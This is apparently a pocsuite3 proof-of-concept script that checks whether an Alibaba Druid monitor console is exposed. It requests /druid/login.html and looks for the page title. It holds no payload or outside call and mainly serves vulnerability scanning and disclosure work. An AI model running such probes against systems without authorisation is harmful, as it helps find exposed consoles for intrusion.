#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from urllib.parse import urljoin
import platform
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)

minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2022'
    createDate = '2023-02-07'
    updateDate = '2023-02-07'
    references = ['https://code84.com/207256.html']
    name = 'alibaba alibaba druid Pre-Auth Information Disclosure'
    appPowerLink = ''
    appName = 'alibaba druid'
    appVersion = ''
    vulType = 'Information Disclosure'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    # def _options(self):
    #     o = OrderedDict()
    #     o['param'] = OptString('', description='The param')
    #     return o

    def _exploit(self):
        payload = '/druid/login.html'
        res = requests.get(urljoin(self.url,payload), headers=self.headers)
        logger.debug(res.text)
        return res.text

    def _verify(self):
        result = {}
        res = self._exploit()
        if "<title>druid monitor</title>" in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']["pageinfo"] = res
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
